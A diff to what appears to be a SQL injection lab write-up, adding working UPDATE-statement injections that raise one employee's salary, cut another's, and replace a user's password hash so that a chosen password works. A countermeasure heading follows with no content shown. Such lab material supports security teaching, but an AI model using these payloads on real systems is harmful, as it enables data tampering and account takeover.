@@ -61,3 +61,25 @@ However, if the multi_query function had been used instead, it would have been p
 inject an UPDATE request with new data for instance.
 
 ## SQL injections on UPDATE statements
+- In order for Alice to commit the perfect crime she needs to make sure that only her salary is changed, this can be done with the following injection:
+    ```sql
+    ', salary='5000000' WHERE Name='Alice' -- 
+    ```
+    ![ALICE SALARY](./Alice_salary.png)
+- now we got Alice a higher salary, let's punish her stingy boss Boby, using the same injection:
+    ```sql
+    ', salary='20' WHERE Name='Boby'# -- 
+    ```
+- Modifying the password will require us to do an extra step as the hash value of the password is the one stored using the SHA1 function, therefore we must inject the hash value of the password we would like:
+    - using the following command in our linux terminal we can determine the hash for our password, in this example we use "Alice":
+        ```shell
+        echo -n "Alice" | sha1sum
+        ```
+    - we inject this hash using the same technique
+        ```sql
+        ' password ='35318264c9a98faf79965c270ac80c5606774df1' WHERE name='Boby'#
+        ```
+        we can see that Boby can only login if he puts Alice in his password box.
+
+##  Countermeasure - prepared statement
+
